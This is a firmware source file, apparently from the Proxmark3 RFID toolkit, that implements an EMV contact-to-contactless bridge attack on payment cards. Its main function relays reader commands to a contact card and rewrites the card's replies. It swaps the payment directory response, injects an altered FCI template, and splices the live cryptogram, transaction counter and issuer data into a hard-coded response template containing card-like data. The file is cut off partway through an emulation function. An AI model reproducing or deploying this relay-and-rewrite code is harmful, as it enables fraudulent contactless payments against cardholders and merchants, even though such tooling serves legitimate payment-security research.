//-----------------------------------------------------------------------------
// Copyright (C) n-hutton - Sept 2024
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// EVM contact to contactless bridge attack
//-----------------------------------------------------------------------------

// Verbose Mode:
// DBG_NONE          0
// DBG_ERROR         1
// DBG_INFO          2
// DBG_DEBUG         3
// DBG_EXTENDED      4

//  /!\ Printing Debug message is disrupting emulation,
//  Only use with caution during debugging

#include "emvsim.h"

#include <inttypes.h>

#include "BigBuf.h"
#include "iso14443a.h"
#include "BigBuf.h"
#include "string.h"
#include "mifareutil.h"
#include "fpgaloader.h"
#include "proxmark3_arm.h"
#include "cmd.h"
#include "protocols.h"
#include "appmain.h"
#include "util.h"
#include "commonutil.h"
#include "crc16.h"
#include "dbprint.h"
#include "ticks.h"
#include "i2c.h"

//static uint8_t saved_command[100] = {0};
//static uint8_t saved_command_len = 0;

static uint8_t filenotfound[] = {0x02, 0x6a, 0x82, 0x93, 0x2f};

// query and response that inserts PDOL so as to continue process...
static uint8_t fci_query[] = {0x02, 0x00, 0xa4, 0x04, 0x00, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x00, 0x56, 0x3f};
static uint8_t fci_template[] = {0x02, 0x6f, 0x5e, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x53, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x38, 0x18, 0x9f, 0x66, 0x04, 0x9f, 0x02, 0x06, 0x9f, 0x03, 0x06, 0x9f, 0x1a, 0x02, 0x95, 0x05, 0x5f, 0x2a, 0x02, 0x9a, 0x03, 0x9c, 0x01, 0x9f, 0x37, 0x04, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x11, 0x01, 0x01, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0xbf, 0x0c, 0x13, 0x9f, 0x5a, 0x05, 0x31, 0x08, 0x26, 0x08, 0x26, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0xd8, 0x15};

// this is a fci template with a modified PDOL (not including CDOL now)
//static uint8_t fci_template[] = { 0x02, 0x6f, 0x5b, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x50, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x38, 0x15, 0x9F, 0x02, 0x06, 0x9F, 0x03, 0x06, 0x9F, 0x1A, 0x02, 0x95, 0x05, 0x5F, 0x2A, 0x02, 0x9A, 0x03, 0x9C, 0x01, 0x9F, 0x37, 0x04, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x11, 0x01, 0x01, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0xbf, 0x0c, 0x13, 0x9f, 0x5a, 0x05, 0x31, 0x08, 0x26, 0x08, 0x26, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0xfc, 0x9d};

//static uint8_t pay1_query[] = {0x03, 0x00, 0xa4, 0x04, 0x00, 0x0e, 0x31, 0x50, 0x41};
//static uint8_t pay2_query[] = {0x03, 0x00, 0xa4, 0x04, 0x00, 0x0e, 0x32, 0x50, 0x41};
static uint8_t pay1_response[] = { 0x6F, 0x1E, 0x84, 0x0E, 0x31, 0x50, 0x41, 0x59 };
static uint8_t pay2_response[] = { 0x03, 0x6f, 0x3e, 0x84, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0xa5, 0x2c, 0xbf, 0x0c, 0x29, 0x61, 0x27, 0x4f, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0xbf, 0x63, 0x04, 0xdf, 0x20, 0x01, 0x80, 0x90, 0x00, 0x07, 0x9d};

void SmartCardRawDog(uint8_t prepend, const smart_card_raw_t *p);

void SmartCardRawDog(uint8_t prepend, const smart_card_raw_t *p) {
    LED_D_ON();

    uint16_t len = 0;
    uint8_t *resp = BigBuf_malloc(ISO7816_MAX_FRAME);
    resp[0] = prepend;
    // check if alloacted...
    smartcard_command_t flags = p->flags;

    //if ((flags & SC_CLEARLOG) == SC_CLEARLOG)
        //clear_trace();

    if ((flags & SC_LOG) == SC_LOG)
        set_tracing(true);
    else
        set_tracing(false);

    if ((flags & SC_CONNECT) == SC_CONNECT) {

        I2C_Reset_EnterMainProgram();

        if ((flags & SC_SELECT) == SC_SELECT) {
            smart_card_atr_t card;
            bool gotATR = GetATR(&card, true);
            //reply_old(CMD_ACK, gotATR, sizeof(smart_card_atr_t), 0, &card, sizeof(smart_card_atr_t));
            if (gotATR == false) {
                Dbprintf("No ATR received...\n");
                //reply_ng(CMD_SMART_RAW, PM3_ESOFT, NULL, 0);
                goto OUT;
            }
        }
    }

    uint32_t wait = SIM_WAIT_DELAY;

    if (((flags & SC_RAW) == SC_RAW) || ((flags & SC_RAW_T0) == SC_RAW_T0)) {

        if ((flags & SC_WAIT) == SC_WAIT) {
            wait = (uint32_t)((p->wait_delay * 1000) / 3.07);
        }

        LogTrace(p->data, p->len, 0, 0, NULL, true);

        bool res = I2C_BufferWrite(
                p->data,
                p->len,
                (((flags & SC_RAW_T0) == SC_RAW_T0) ? I2C_DEVICE_CMD_SEND_T0 : I2C_DEVICE_CMD_SEND),
                I2C_DEVICE_ADDRESS_MAIN
        );

        if (res == false && g_dbglevel > 3) {
            //DbpString(I2C_ERROR);
            //reply_ng(CMD_SMART_RAW, PM3_ESOFT, NULL, 0);
            Dbprintf("SmartCardRawDog: I2C_BufferWrite failed\n");
            goto OUT;
        }

        // read bytes from module
        len = ISO7816_MAX_FRAME;
        res = sc_rx_bytes(&resp[1], &len, wait);
        if (res) {
            LogTrace(&resp[1], len, 0, 0, NULL, false);
        } else {
            len = 0;
        }
    }

    if (len == 2 && resp[1] == 0x61) {
        //Dbprintf("Data to be read: len = %d\n", len);
        //Dbprintf("\n");

        uint8_t cmd_getresp[] = {0x00, ISO7816_GET_RESPONSE, 0x00, 0x00, resp[2]};
        //smart_card_raw_t *payload = calloc(1, sizeof(smart_card_raw_t) + sizeof(cmd_getresp));
        smart_card_raw_t *payload = (smart_card_raw_t *)BigBuf_calloc(sizeof(smart_card_raw_t) + sizeof(cmd_getresp));
        payload->flags = SC_RAW | SC_LOG;
        payload->len = sizeof(cmd_getresp);
        payload->wait_delay = 0;
        memcpy(payload->data, cmd_getresp, sizeof(cmd_getresp));

        SmartCardRawDog(prepend, payload);
    } else if (len == 2) {
        Dbprintf("***** BAD response from card (response unsupported)...");
        Dbhexdump(3, &resp[0], false);
        resp[0] = prepend;
        resp[1] = 0x6a;
        resp[2] =0x82;
        AddCrc14A(resp, 3);

        //Dbhexdump(5, &resp[0], false); // nathan print
        //EmSendCmd14443aRaw(&resp[0], 5);
        EmSendCmd(&resp[0], 5);
    }

    if (resp[1] == 0x6a && resp[2] == 0x82) {
        Dbprintf("***** bad response from card (file not found)...");
        resp[0] = prepend;
        resp[1] = 0x6a;
        resp[2] =0x82;
        AddCrc14A(resp, 3);

        //Dbhexdump(5, &resp[0], false); // nathan print
        //EmSendCmd14443aRaw(&resp[0], 5);
        EmSendCmd(&resp[0], 5);
        FpgaDisableTracing();
    }

    if (len > 2) {
        // print nathan
        Dbprintf("***** sending it over the wire... len: %d =>\n", len);
        resp[1] = prepend;

        // if we have a generate AC request, lets extract the data and populate the template
        if (resp[1] != 0xff && resp[2] == 0x77) {
            Dbprintf("we have detected a generate ac response, lets repackage it!");
            Dbhexdump(len, &resp[1], false); // nathan print
            // 11 and 12 are trans counter.
            // 16 to 24 are the cryptogram
            // 27 to 34 is issuer application data
            Dbprintf("atc: %d %d, cryptogram: %d ", resp[11], resp[12], resp[13]);

            // then, on the template:
            // 61 and 62 for counter
            // 46 to 54 for cryptogram
            // 36 to 43 for issuer application data

            uint8_t template[] = { 0x00, 0x00, 0x77, 0x47, 0x82, 0x02, 0x39, 0x00, 0x57, 0x13, 0x47, 0x62, 0x28, 0x00, 0x05, 0x93, 0x38, 0x64, 0xd2, 0x70, 0x92, 0x01, 0x00, 0x00, 0x01, 0x42, 0x00, 0x00, 0x0f, 0x5f, 0x34, 0x01, 0x00, 0x9f, 0x10, 0x07, 0x06, 0x01, 0x12, 0x03, 0xa0, 0x20, 0x00, 0x9f, 0x26, 0x08, 0x56, 0xcb, 0x4e, 0xe1, 0xa4, 0xef, 0xac, 0x74, 0x9f, 0x27, 0x01, 0x80, 0x9f, 0x36, 0x02, 0x00, 0x07, 0x9f, 0x6c, 0x02, 0x3e, 0x00, 0x9f, 0x6e, 0x04, 0x20, 0x70, 0x00, 0x00, 0x90, 0x00, 0xff, 0xff};

            // do the replacement
            template[1] = resp[1]; // class bit

            template[61] = resp[11];
            template[62] = resp[12];

            template[46] = resp[16];
            template[47] = resp[17];
            template[48] = resp[18];
            template[49] = resp[19];
            template[50] = resp[20];
            template[51] = resp[21];
            template[52] = resp[22];
            template[53] = resp[23];
            template[54] = resp[24];

            template[36] = resp[27];
            template[37] = resp[28];
            template[38] = resp[29];
            template[39] = resp[30];
            template[40] = resp[31];
            template[41] = resp[32];
            template[42] = resp[33];

            Dbprintf("\nrearranged is: ");
            len = sizeof(template);
            Dbhexdump(len, &template[0], false); // nathan print

            AddCrc14A(&template[1], len-3);
            Dbprintf("\nafter crc rearranged is: ");
            Dbhexdump(len, &template[0], false); // nathan print
            Dbprintf("\n");

            EmSendCmd(&template[1], len-1);
            BigBuf_free();
            return;
        }

        //Dbhexdump(len, &resp[1], false); // nathan print
        AddCrc14A(&resp[1], len);
        Dbhexdump(len+2, &resp[1], false); // nathan print

        // Check we don't want to modify the response (application profile response)
        //uint8_t modifyme[] = {0x03, 0x77, 0x0e, 0x82, 0x02};

        BigBuf_free();

        if (prepend == 0xff) {
            Dbprintf("pdol request, we can can the response...");
            return;
        }

        if (memcmp(&resp[2], &pay1_response[0], sizeof(pay1_response)) == 0 && true) {
            Dbprintf("Switching out the pay1 response for a pay2 response...");
            EmSendCmd(&pay2_response[0], sizeof(pay2_response));
        }
        else if (memcmp(&resp[1], &fci_template[0], 2) == 0 && true) {
            Dbprintf("***** modifying response to have full fci template...!");
            EmSendCmd(&fci_template[0], sizeof(fci_template));
        } else {
            //Dbprintf("***** not modifying response...");
            EmSendCmd(&resp[1], len + 2);
        }

        BigBuf_free();

        //memcpy(saved_command, &resp[1], len+2);
        //saved_command_len = len+2;
        //EmSendCmd14443aRaw(&resp[1], len+2);
        //FpgaDisableTracing();
        //EmSend4bit(encrypted_data ? mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA) : CARD_NACK_NA);
    }

    //reply_ng(CMD_SMART_RAW, PM3_SUCCESS, resp, len);

    OUT:
    //BigBuf_free();
    //set_tracing(false);
    LEDsoff();
}

//typedef enum SMARTCARD_COMMAND {
//    SC_CONNECT = (1 << 0),
//    SC_NO_DISCONNECT = (1 << 1),
//    SC_RAW = (1 << 2),
//    SC_SELECT = (1 << 3),
//    SC_RAW_T0 = (1 << 4),
//    SC_CLEARLOG = (1 << 5),
//    SC_LOG = (1 << 6),
//    SC_WAIT = (1 << 7),
//} smartcard_command_t;

//typedef struct {
//    uint8_t flags;
//    uint32_t wait_delay;
//    uint16_t len;
//    uint8_t data[];
//} PACKED smart_card_raw_t;


static int CmdSmartRaw(const uint8_t prepend, const uint8_t *data, int dlen, uint8_t *buffer) {

    Dbprintf("sending command to smart card... %02x %02x %02x... =>", prepend, data[0], data[1]);
    Dbhexdump(dlen, data, false);

    if (data[4] + 5 != dlen) {
        Dbprintf("invalid length of data. Received: %d, command specifies %d", dlen, data[4] + 5);
        dlen = data[4] + 5;
    }

    //smart_card_raw_t *payload = calloc(1, sizeof(smart_card_raw_t) + dlen);
    smart_card_raw_t *payload = (smart_card_raw_t *)BigBuf_calloc(sizeof(smart_card_raw_t) + dlen);
    if (payload == NULL) {
        Dbprintf("failed to allocate memory");
        return PM3_EMALLOC;
    }
    payload->len = dlen;
    memcpy(payload->data, data, dlen);

    payload->flags = SC_LOG;
    bool active = true;
    bool active_select = false;
    int timeout = 600;
    bool use_t0 = true;

    if (active || active_select) {

        payload->flags |= (SC_CONNECT | SC_CLEARLOG);
        if (active_select)
            payload->flags |= SC_SELECT;
    }

    payload->wait_delay = 0;
    if (timeout > -1) {
        payload->flags |= SC_WAIT;
        payload->wait_delay = timeout;
    }
    //Dbprintf("SIM Card timeout... %u ms", payload->wait_delay);

    if (dlen > 0) {
        if (use_t0)
            payload->flags |= SC_RAW_T0;
        else
            payload->flags |= SC_RAW;
    }

    ////uint8_t *buf = calloc(PM3_CMD_DATA_SIZE, sizeof(uint8_t));
    //uint8_t *buf = BigBuf_calloc(PM3_CMD_DATA_SIZE, sizeof(uint8_t));
    //if (buf == NULL) {
    //    Dbprintf("failed to allocate memory");
    //    free(payload);
    //    return PM3_EMALLOC;
    //}


    //clearCommandBuffer();
    //SendCommandNG(CMD_SMART_RAW, (uint8_t *)payload, sizeof(smart_card_raw_t) + dlen);

    //for (int i = 0; i < dlen; i++) {
    //    Dbprintf("%02x ", data[i]);
    //}

    SmartCardRawDog(prepend, payload);

    //if (reply == false) {
    //    Dbprintf("failed to talk to smart card!!!");
    //    goto out;
    //}

    //// reading response from smart card
    //int len = smart_response(buf, PM3_CMD_DATA_SIZE);
    //if (len < 0) {
    //    free(payload);
    //    free(buf);
    //    return PM3_ESOFT;
    //}

    //if (buf[0] == 0x6C) {

    //    // request more bytes to download
    //    data[4] = buf[1];
    //    memcpy(payload->data, data, dlen);
    //    clearCommandBuffer();
    //    SendCommandNG(CMD_SMART_RAW, (uint8_t *)payload, sizeof(smart_card_raw_t) + dlen);

    //    len = smart_response(buf, PM3_CMD_DATA_SIZE);

    //    data[4] = 0;
    //}

    //if (decode_tlv && len > 4) {
    //    TLVPrintFromBuffer(buf, len - 2);
    //} else {
    //    if (len > 2) {
    //        Dbprintf("Response data:");
    //        Dbprintf(" # | bytes                                           | ascii");
    //        Dbprintf("---+-------------------------------------------------+-----------------");
    //        print_hex_break(buf, len, 16);
    //    }
    //}

    //memcpy(buffer, buf, len);

    //out:
    //free(payload);
    //free(buf);
    return PM3_SUCCESS;
}

static bool EMVSimInit(uint16_t flags, uint8_t *datain, uint16_t atqa, uint8_t sak, tag_response_info_t **responses, uint32_t *cuid, uint8_t *uid_len, uint8_t **rats, uint8_t *rats_len) {

    // SPEC: https://www.nxp.com/docs/en/application-note/AN10833.pdf
    // ATQA
    static uint8_t rATQA_Mini[]  = {0x04, 0x00};             // indicate Mifare classic Mini 4Byte UID
    static uint8_t rATQA_1k[]    = {0x04, 0x00};             // indicate Mifare classic 1k 4Byte UID
    static uint8_t rATQA_2k[]    = {0x04, 0x00};             // indicate Mifare classic 2k 4Byte UID
    static uint8_t rATQA_4k[]    = {0x02, 0x00};             // indicate Mifare classic 4k 4Byte UID

    // SAK
    static uint8_t rSAK_Mini = 0x09;    // mifare Mini
    static uint8_t rSAK_1k   = 0x08;    // mifare 1k
    static uint8_t rSAK_2k   = 0x08;    // mifare 2k with RATS support
    static uint8_t rSAK_4k   = 0x18;    // mifare 4k

    static uint8_t rUIDBCC1[]   = {0x00, 0x00, 0x00, 0x00, 0x00};   // UID 1st cascade level
    static uint8_t rUIDBCC1b4[] = {0x00, 0x00, 0x00, 0x00};         // UID 1st cascade level, last 4 bytes
    static uint8_t rUIDBCC1b3[] = {0x00, 0x00, 0x00};               // UID 1st cascade level, last 3 bytes
    static uint8_t rUIDBCC1b2[] = {0x00, 0x00};                     // UID 1st cascade level, last 2 bytes
    static uint8_t rUIDBCC1b1[] = {0x00};                           // UID 1st cascade level, last byte
    static uint8_t rUIDBCC2[]   = {0x00, 0x00, 0x00, 0x00, 0x00};   // UID 2nd cascade level
    static uint8_t rUIDBCC2b4[] = {0x00, 0x00, 0x00, 0x00};         // UID 2st cascade level, last 4 bytes
    static uint8_t rUIDBCC2b3[] = {0x00, 0x00, 0x00};               // UID 2st cascade level, last 3 bytes
    static uint8_t rUIDBCC2b2[] = {0x00, 0x00};                     // UID 2st cascade level, last 2 bytes
    static uint8_t rUIDBCC2b1[] = {0x00};                           // UID 2st cascade level, last byte
    static uint8_t rUIDBCC3[]   = {0x00, 0x00, 0x00, 0x00, 0x00};   // UID 3nd cascade level
    static uint8_t rUIDBCC3b4[] = {0x00, 0x00, 0x00, 0x00};         // UID 3st cascade level, last 4 bytes
    static uint8_t rUIDBCC3b3[] = {0x00, 0x00, 0x00};               // UID 3st cascade level, last 3 bytes
    static uint8_t rUIDBCC3b2[] = {0x00, 0x00};                     // UID 3st cascade level, last 2 bytes
    static uint8_t rUIDBCC3b1[] = {0x00};                           // UID 3st cascade level, last byte

    static uint8_t rATQA[]     = {0x00, 0x00};             // Current ATQA
    static uint8_t rSAK[]      = {0x00, 0x00, 0x00};       // Current SAK, CRC
    static uint8_t rSAKuid[]   = {0x04, 0xda, 0x17};       // UID incomplete cascade bit, CRC

    // RATS answer for 2K NXP mifare classic (with CRC)
    static uint8_t rRATS[]     = {0x0c, 0x75, 0x77, 0x80, 0x02, 0xc1, 0x05, 0x2f, 0x2f, 0x01, 0xbc, 0xd6, 0x60, 0xd3};

    *uid_len = 0;

    // By default use 1K tag
    memcpy(rATQA, rATQA_1k, sizeof(rATQA));
    rSAK[0] = rSAK_1k;

    //by default RATS not supported
    *rats_len = 0;
    *rats = NULL;

    // -- Determine the UID
    // Can be set from emulator memory or incoming data
    // Length: 4,7,or 10 bytes

    // Get UID, SAK, ATQA from EMUL
    if ((flags & FLAG_UID_IN_EMUL) == FLAG_UID_IN_EMUL) {
        uint8_t block0[16];
        emlGet(block0, 0, 16);

        // If uid size defined, copy only uid from EMUL to use, backward compatibility for 'hf_colin.c', 'hf_mattyrun.c'
        if ((flags & (FLAG_4B_UID_IN_DATA | FLAG_7B_UID_IN_DATA | FLAG_10B_UID_IN_DATA)) != 0) {
            memcpy(datain, block0, 10);  // load 10bytes from EMUL to the datain pointer. to be used below.
        } else {
            // Check for 4 bytes uid: bcc corrected and single size uid bits in ATQA
            if ((block0[0] ^ block0[1] ^ block0[2] ^ block0[3]) == block0[4] && (block0[6] & 0xc0) == 0) {
                flags |= FLAG_4B_UID_IN_DATA;
                memcpy(datain, block0, 4);
                rSAK[0] = block0[5];
                memcpy(rATQA, &block0[6], sizeof(rATQA));
            }
                // Check for 7 bytes UID: double size uid bits in ATQA
            else if ((block0[8] & 0xc0) == 0x40) {
                flags |= FLAG_7B_UID_IN_DATA;
                memcpy(datain, block0, 7);
                rSAK[0] = block0[7];
                memcpy(rATQA, &block0[8], sizeof(rATQA));
            } else {
                Dbprintf("ERROR: " _RED_("Invalid dump. UID/SAK/ATQA not found"));
                return false;
            }
        }

    }

    // Tune tag type, if defined directly
    // Otherwise use defined by default or extracted from EMUL
    if ((flags & FLAG_MF_MINI) == FLAG_MF_MINI) {
        memcpy(rATQA, rATQA_Mini, sizeof(rATQA));
        rSAK[0] = rSAK_Mini;
        if (999 > DBG_NONE) Dbprintf("Enforcing Mifare Mini ATQA/SAK");
    } else if ((flags & FLAG_MF_1K) == FLAG_MF_1K) {
        memcpy(rATQA, rATQA_1k, sizeof(rATQA));
        rSAK[0] = rSAK_1k;
        if (999 > DBG_NONE) Dbprintf("Enforcing Mifare 1K ATQA/SAK (!!!!)");
    } else if ((flags & FLAG_MF_2K) == FLAG_MF_2K) {
        memcpy(rATQA, rATQA_2k, sizeof(rATQA));
        rSAK[0] = rSAK_2k;
        *rats = rRATS;
        *rats_len = sizeof(rRATS);
        if (999 > DBG_NONE) Dbprintf("Enforcing Mifare 2K ATQA/SAK with RATS support");
    } else if ((flags & FLAG_MF_4K) == FLAG_MF_4K) {
        memcpy(rATQA, rATQA_4k, sizeof(rATQA));
        rSAK[0] = rSAK_4k;
        if (999 > DBG_NONE) Dbprintf("Enforcing Mifare 4K ATQA/SAK");
    }

    // Prepare UID arrays
    if ((flags & FLAG_4B_UID_IN_DATA) == FLAG_4B_UID_IN_DATA) { // get UID from datain
        memcpy(rUIDBCC1, datain, 4);
        *uid_len = 4;
        if (999 >= DBG_EXTENDED)
            Dbprintf("MifareSimInit - FLAG_4B_UID_IN_DATA => Get UID from datain: %02X - Flag: %02X - UIDBCC1: %02X", FLAG_4B_UID_IN_DATA, flags, rUIDBCC1);


        // save CUID
        *cuid = bytes_to_num(rUIDBCC1, 4);
        // BCC
        rUIDBCC1[4] = rUIDBCC1[0] ^ rUIDBCC1[1] ^ rUIDBCC1[2] ^ rUIDBCC1[3];
        if (999 > DBG_NONE) {
            Dbprintf("4B UID: %02x%02x%02x%02x", rUIDBCC1[0], rUIDBCC1[1], rUIDBCC1[2], rUIDBCC1[3]);
        }

        // Correct uid size bits in ATQA
        rATQA[0] = (rATQA[0] & 0x3f) | 0x00; // single size uid

    } else if ((flags & FLAG_7B_UID_IN_DATA) == FLAG_7B_UID_IN_DATA) {
        memcpy(&rUIDBCC1[1], datain, 3);
        memcpy(rUIDBCC2, datain + 3, 4);
        *uid_len = 7;
        if (999 >= DBG_EXTENDED)
            Dbprintf("MifareSimInit - FLAG_7B_UID_IN_DATA => Get UID from datain: %02X - Flag: %02X - UIDBCC1: %02X", FLAG_7B_UID_IN_DATA, flags, rUIDBCC1);

        // save CUID
        *cuid = bytes_to_num(rUIDBCC2, 4);
        // CascadeTag, CT
        rUIDBCC1[0] = MIFARE_SELECT_CT;
        // BCC
        rUIDBCC1[4] = rUIDBCC1[0] ^ rUIDBCC1[1] ^ rUIDBCC1[2] ^ rUIDBCC1[3];
        rUIDBCC2[4] = rUIDBCC2[0] ^ rUIDBCC2[1] ^ rUIDBCC2[2] ^ rUIDBCC2[3];
        if (999 > DBG_NONE) {
            Dbprintf("7B UID: %02x %02x %02x %02x %02x %02x %02x",
                     rUIDBCC1[1], rUIDBCC1[2], rUIDBCC1[3], rUIDBCC2[0], rUIDBCC2[1], rUIDBCC2[2], rUIDBCC2[3]);
        }

        // Correct uid size bits in ATQA
        rATQA[0] = (rATQA[0] & 0x3f) | 0x40; // double size uid

    } else if ((flags & FLAG_10B_UID_IN_DATA) == FLAG_10B_UID_IN_DATA) {
        memcpy(&rUIDBCC1[1], datain,   3);
        memcpy(&rUIDBCC2[1], datain + 3, 3);
        memcpy(rUIDBCC3,    datain + 6, 4);
        *uid_len = 10;
        if (999 >= DBG_EXTENDED)
            Dbprintf("MifareSimInit - FLAG_10B_UID_IN_DATA => Get UID from datain: %02X - Flag: %02X - UIDBCC1: %02X", FLAG_10B_UID_IN_DATA, flags, rUIDBCC1);

        // save CUID
        *cuid = bytes_to_num(rUIDBCC3, 4);
        // CascadeTag, CT
        rUIDBCC1[0] = MIFARE_SELECT_CT;
        rUIDBCC2[0] = MIFARE_SELECT_CT;
        // BCC
        rUIDBCC1[4] = rUIDBCC1[0] ^ rUIDBCC1[1] ^ rUIDBCC1[2] ^ rUIDBCC1[3];
        rUIDBCC2[4] = rUIDBCC2[0] ^ rUIDBCC2[1] ^ rUIDBCC2[2] ^ rUIDBCC2[3];
        rUIDBCC3[4] = rUIDBCC3[0] ^ rUIDBCC3[1] ^ rUIDBCC3[2] ^ rUIDBCC3[3];

        if (999 > DBG_NONE) {
            Dbprintf("10B UID: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                     rUIDBCC1[1], rUIDBCC1[2], rUIDBCC1[3],
                     rUIDBCC2[1], rUIDBCC2[2], rUIDBCC2[3],
                     rUIDBCC3[0], rUIDBCC3[1], rUIDBCC3[2], rUIDBCC3[3]
                    );
        }

        // Correct uid size bits in ATQA
        rATQA[0] = (rATQA[0] & 0x3f) | 0x80; // triple size uid
    } else {
        Dbprintf("ERROR: " _RED_("UID size not defined"));
        return false;
    }
    if (flags & FLAG_FORCED_ATQA) {
        rATQA[0] = atqa >> 8;
        rATQA[1] = atqa & 0xff;
    }
    if (flags & FLAG_FORCED_SAK) {
        rSAK[0] = sak;
    }

    if (999 > DBG_NONE) {
        Dbprintf("ATQA  : %02X %02X", rATQA[1], rATQA[0]);
        Dbprintf("SAK   : %02X", rSAK[0]);
    }

    // clone UIDs for byte-frame anti-collision multiple tag selection procedure
    memcpy(rUIDBCC1b4, &rUIDBCC1[1], 4);
    memcpy(rUIDBCC1b3, &rUIDBCC1[2], 3);
    memcpy(rUIDBCC1b2, &rUIDBCC1[3], 2);
    memcpy(rUIDBCC1b1, &rUIDBCC1[4], 1);
    if (*uid_len >= 7) {
        memcpy(rUIDBCC2b4, &rUIDBCC2[1], 4);
        memcpy(rUIDBCC2b3, &rUIDBCC2[2], 3);
        memcpy(rUIDBCC2b2, &rUIDBCC2[3], 2);
        memcpy(rUIDBCC2b1, &rUIDBCC2[4], 1);
    }
    if (*uid_len == 10) {
        memcpy(rUIDBCC3b4, &rUIDBCC3[1], 4);
        memcpy(rUIDBCC3b3, &rUIDBCC3[2], 3);
        memcpy(rUIDBCC3b2, &rUIDBCC3[3], 2);
        memcpy(rUIDBCC3b1, &rUIDBCC3[4], 1);
    }

    // Calculate actual CRC
    AddCrc14A(rSAK, sizeof(rSAK) - 2);

#define TAG_RESPONSE_COUNT 18
    static tag_response_info_t responses_init[TAG_RESPONSE_COUNT] = {
        { .response = rATQA,     .response_n = sizeof(rATQA)     },     // Answer to request - respond with card type
        { .response = rSAK,      .response_n = sizeof(rSAK)      },     //
        { .response = rSAKuid,   .response_n = sizeof(rSAKuid)   },     //
        // Do not reorder. Block used via relative index of rUIDBCC1
        { .response = rUIDBCC1,  .response_n = sizeof(rUIDBCC1)  },     // Anticollision cascade1 - respond with first part of uid
        { .response = rUIDBCC1b4, .response_n = sizeof(rUIDBCC1b4)},
        { .response = rUIDBCC1b3, .response_n = sizeof(rUIDBCC1b3)},
        { .response = rUIDBCC1b2, .response_n = sizeof(rUIDBCC1b2)},
        { .response = rUIDBCC1b1, .response_n = sizeof(rUIDBCC1b1)},
        // Do not reorder. Block used via relative index of rUIDBCC2
        { .response = rUIDBCC2,  .response_n = sizeof(rUIDBCC2)  },     // Anticollision cascade2 - respond with 2nd part of uid
        { .response = rUIDBCC2b4, .response_n = sizeof(rUIDBCC2b4)},
        { .response = rUIDBCC2b3, .response_n = sizeof(rUIDBCC2b3)},
        { .response = rUIDBCC2b2, .response_n = sizeof(rUIDBCC2b2)},
        { .response = rUIDBCC2b1, .response_n = sizeof(rUIDBCC2b1)},
        // Do not reorder. Block used via relative index of rUIDBCC3
        { .response = rUIDBCC3,  .response_n = sizeof(rUIDBCC3)  },     // Anticollision cascade3 - respond with 3th part of uid
        { .response = rUIDBCC3b4, .response_n = sizeof(rUIDBCC3b4)},
        { .response = rUIDBCC3b3, .response_n = sizeof(rUIDBCC3b3)},
        { .response = rUIDBCC3b2, .response_n = sizeof(rUIDBCC3b2)},
        { .response = rUIDBCC3b1, .response_n = sizeof(rUIDBCC3b1)}
    };

    // Prepare ("precompile") the responses of the anticollision phase.
    // There will be not enough time to do this at the moment the reader sends its REQA or SELECT
    // There are 18 predefined responses with a total of 53 bytes data to transmit.
    // Coded responses need one byte per bit to transfer (data, parity, start, stop, correction)
    // 53 * 8 data bits, 53 * 1 parity bits, 18 start bits, 18 stop bits, 18 correction bits  ->   need 571 bytes buffer
#define ALLOCATED_TAG_MODULATION_BUFFER_SIZE 571

    uint8_t *free_buffer = BigBuf_malloc(ALLOCATED_TAG_MODULATION_BUFFER_SIZE);
    // modulation buffer pointer and current buffer free space size
    uint8_t *free_buffer_pointer = free_buffer;
    size_t free_buffer_size = ALLOCATED_TAG_MODULATION_BUFFER_SIZE;

    for (size_t i = 0; i < TAG_RESPONSE_COUNT; i++) {
        if (prepare_allocated_tag_modulation(&responses_init[i], &free_buffer_pointer, &free_buffer_size) == false) {
            Dbprintf("Not enough modulation buffer size, exit after %d elements", i);
            return false;
        }
    }

    *responses = responses_init;

    // indices into responses array:
#define ATQA     0
#define SAK      1
#define SAKuid   2
#define UIDBCC1  3
#define UIDBCC2  8
#define UIDBCC3  13

    return true;
}

/**
*xxxxxxxxxxxxxxxxxx.
*
*@param flags :
*@param exitAfterNReads, exit simulation after n blocks have been read, 0 is infinite ...
* (unless reader attack mode enabled then it runs util it gets enough nonces to recover all keys attmpted)
*/
void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t atqa, uint8_t sak) {

    Dbprintf("EVMsim: flags=%04x, exitAfterNReads=%d, datain=%p, atqa=%04x, sak=%02x", flags, exitAfterNReads, datain, atqa, sak);

    tag_response_info_t *responses;
    uint8_t cardSTATE = MFEMUL_NOFIELD;
    uint8_t uid_len = 0; // 4, 7, 10
